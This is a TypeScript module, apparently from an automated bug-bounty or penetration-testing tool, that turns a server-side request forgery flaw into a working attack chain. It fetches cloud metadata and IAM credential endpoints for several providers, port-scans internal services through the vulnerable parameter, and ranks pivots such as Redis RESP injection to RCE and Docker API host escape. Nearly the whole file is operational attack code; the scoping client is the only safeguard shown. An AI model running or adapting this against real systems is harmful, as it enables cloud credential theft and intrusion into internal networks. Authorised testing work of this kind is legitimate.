import axios from "axios";
import logger from "../../utils/logger";
import { scopedHttp } from "../net/scoped-http";

export interface SSRFPivotResult {
  reachableEndpoints: string[];
  cloudMetadata: Record<string, unknown> | null;
  internalPorts: Array<{ port: number; service: string; open: boolean }>;
  pivotHypotheses: Array<{ vulnClass: string; reasoning: string; confidence: number; priority: number }>;
}

const CLOUD_METADATA_URLS = [
  "http://169.254.169.254/latest/meta-data/",
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "http://169.254.170.2/v2/credentials",        // AWS ECS
  "http://100.100.100.200/latest/meta-data/",    // Alibaba Cloud
  "http://metadata.google.internal/computeMetadata/v1/",
  "http://169.254.169.254/metadata/v1/",         // DigitalOcean
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure
];

const INTERNAL_PORTS = [
  { port: 22,    service: "ssh" },
  { port: 80,    service: "http" },
  { port: 443,   service: "https" },
  { port: 3306,  service: "mysql" },
  { port: 5432,  service: "postgres" },
  { port: 6379,  service: "redis" },
  { port: 9200,  service: "elasticsearch" },
  { port: 27017, service: "mongodb" },
  { port: 8080,  service: "http-alt" },
  { port: 8443,  service: "https-alt" },
  { port: 2375,  service: "docker" },
  { port: 4243,  service: "docker-tls" },
];

const INTERNAL_HOSTS = ["127.0.0.1", "localhost", "10.0.0.1", "192.168.1.1", "172.17.0.1"];

class SSRFChainProber {
  async probe(
    ssrfVectorUrl: string,
    ssrfParam: string,
    authHeaders: Record<string, string> = {},
    programId?: number
  ): Promise<SSRFPivotResult> {
    const result: SSRFPivotResult = {
      reachableEndpoints: [],
      cloudMetadata: null,
      internalPorts: [],
      pivotHypotheses: [],
    };

    // 1. Cloud metadata probe
    result.cloudMetadata = await this.probeCloudMetadata(ssrfVectorUrl, ssrfParam, authHeaders, programId);
    if (result.cloudMetadata) {
      result.pivotHypotheses.push({
        vulnClass: "rce",
        reasoning: `SSRF → Cloud metadata exposed (${JSON.stringify(result.cloudMetadata).slice(0, 100)}). IAM credential theft possible → lateral RCE.`,
        confidence: 0.85,
        priority: 10,
      });
      result.reachableEndpoints.push("cloud-metadata");
    }

    // 2. Internal port scan via SSRF
    const portResults = await Promise.allSettled(
      INTERNAL_PORTS.map(({ port, service }) =>
        this.probeInternalPort(ssrfVectorUrl, ssrfParam, "127.0.0.1", port, service, authHeaders, programId)
      )
    );

    portResults.forEach((r, i) => {
      if (r.status === "fulfilled" && r.value.open) {
        result.internalPorts.push(r.value);
        result.reachableEndpoints.push(`127.0.0.1:${r.value.port}`);
        result.pivotHypotheses.push(this.portToHypothesis(r.value));
      }
    });

    logger.info("[SSRFChainProber] Pivot complete", {
      reachable: result.reachableEndpoints.length,
      cloudMeta: !!result.cloudMetadata,
      openPorts: result.internalPorts.filter(p => p.open).length,
    });

    return result;
  }

  private async probeCloudMetadata(
    vectorUrl: string,
    ssrfParam: string,
    authHeaders: Record<string, string>,
    programId?: number
  ): Promise<Record<string, unknown> | null> {
    for (const metaUrl of CLOUD_METADATA_URLS) {
      try {
        const probeUrl = this.injectSSRFTarget(vectorUrl, ssrfParam, metaUrl);
        // probeUrl targets the in-scope vector host (the internal URL is carried
        // as a parameter value); scopedHttp re-validates as defense-in-depth.
        const resp = await scopedHttp.get(probeUrl, {
          headers: {
            ...authHeaders,
            // Azure requires this header
            "Metadata": "true",
          },
          timeout: 5000,
          validateStatus: () => true,
          maxRedirects: 3,
        }, programId);
        if (resp.status === 200 && resp.data) {
          const body = typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data);
          if (this.isMetadataResponse(body)) {
            logger.warn("[SSRFChainProber] Cloud metadata leaked!", { metaUrl, preview: body.slice(0, 200) });
            return { source: metaUrl, preview: body.slice(0, 500) };
          }
        }
      } catch { /* expected — target may block or redirect */ }
    }
    return null;
  }

  private async probeInternalPort(
    vectorUrl: string,
    ssrfParam: string,
    host: string,
    port: number,
    service: string,
    authHeaders: Record<string, string>,
    programId?: number
  ): Promise<{ port: number; service: string; open: boolean }> {
    try {
      const target = `http://${host}:${port}/`;
      const probeUrl = this.injectSSRFTarget(vectorUrl, ssrfParam, target);
      const resp = await scopedHttp.get(probeUrl, {
        headers: authHeaders,
        timeout: 4000,
        validateStatus: () => true,
      }, programId);
      // Any non-connection-refused response indicates port is open
      const open = resp.status > 0;
      return { port, service, open };
    } catch (err) {
      const code = (err as { code?: string }).code;
      // ECONNREFUSED from the target's perspective = port closed on internal host
      // Timeouts or generic errors = port might be open but filtered
      return { port, service, open: false };
    }
  }

  private injectSSRFTarget(vectorUrl: string, ssrfParam: string, target: string): string {
    try {
      const u = new URL(vectorUrl);
      u.searchParams.set(ssrfParam, target);
      return u.toString();
    } catch {
      return `${vectorUrl}?${ssrfParam}=${encodeURIComponent(target)}`;
    }
  }

  private isMetadataResponse(body: string): boolean {
    const patterns = [
      /ami-id/i,
      /instance-id/i,
      /security-credentials/i,
      /computeMetadata/i,
      /instanceId/i,
      /publicIpv4/i,
      /AccessKeyId/i,
      /privateIpAddress/i,
    ];
    return patterns.some(p => p.test(body));
  }

  private portToHypothesis(port: { port: number; service: string; open: boolean }) {
    const serviceHypothesisMap: Record<string, { vulnClass: string; reasoning: string; confidence: number; priority: number }> = {
      mysql:         { vulnClass: "sqli",         reasoning: `SSRF → MySQL port ${port.port} open internally. Potential credential theft or direct DB access via SSRF pivot.`, confidence: 0.75, priority: 9 },
      postgres:      { vulnClass: "sqli",         reasoning: `SSRF → PostgreSQL port ${port.port} open. Internal DB accessible via SSRF.`, confidence: 0.75, priority: 9 },
      redis:         { vulnClass: "rce",          reasoning: `SSRF → Redis port ${port.port} open (no auth common). SSRF → RESP injection → RCE via cron/SSH keys.`, confidence: 0.8,  priority: 10 },
      elasticsearch: { vulnClass: "info_disclosure", reasoning: `SSRF → Elasticsearch port ${port.port} open. Unauthenticated cluster data access.`, confidence: 0.8, priority: 8 },
      mongodb:       { vulnClass: "sqli",         reasoning: `SSRF → MongoDB port ${port.port} accessible. Potential unauthenticated data access.`, confidence: 0.7, priority: 8 },
      docker:        { vulnClass: "rce",          reasoning: `SSRF → Docker API port ${port.port} exposed internally. Container escape / host RCE possible.`, confidence: 0.9, priority: 10 },
      "docker-tls":  { vulnClass: "rce",          reasoning: `SSRF → Docker TLS port ${port.port} accessible. Privileged container creation → host RCE.`, confidence: 0.85, priority: 10 },
      ssh:           { vulnClass: "info_disclosure", reasoning: `SSRF → SSH port ${port.port} accessible. Banner grabbing possible; credential spraying via SSRF.`, confidence: 0.6, priority: 7 },
      "http-alt":    { vulnClass: "idor",         reasoning: `SSRF → Internal HTTP service on port ${port.port}. Admin panel or internal API accessible.`, confidence: 0.65, priority: 7 },
      "https-alt":   { vulnClass: "idor",         reasoning: `SSRF → Internal HTTPS service on port ${port.port}. Admin panel or internal API accessible.`, confidence: 0.65, priority: 7 },
    };
    return serviceHypothesisMap[port.service] ?? {
      vulnClass: "ssrf",
      reasoning: `SSRF → Internal port ${port.port} (${port.service}) reachable.`,
      confidence: 0.6,
      priority: 6,
    };
  }

  // Detect SSRF parameter from URL — returns best guess param name
  detectSSRFParam(url: string): string {
    const ssrfParams = ["url", "uri", "redirect", "dest", "destination", "target", "src", "source", "callback", "return", "next", "link", "page", "path", "file", "fetch"];
    try {
      const u = new URL(url);
      for (const p of ssrfParams) {
        if (u.searchParams.has(p)) return p;
      }
    } catch { /* ignore */ }
    return "url";
  }
}

export const ssrfChainProber = new SSRFChainProber();
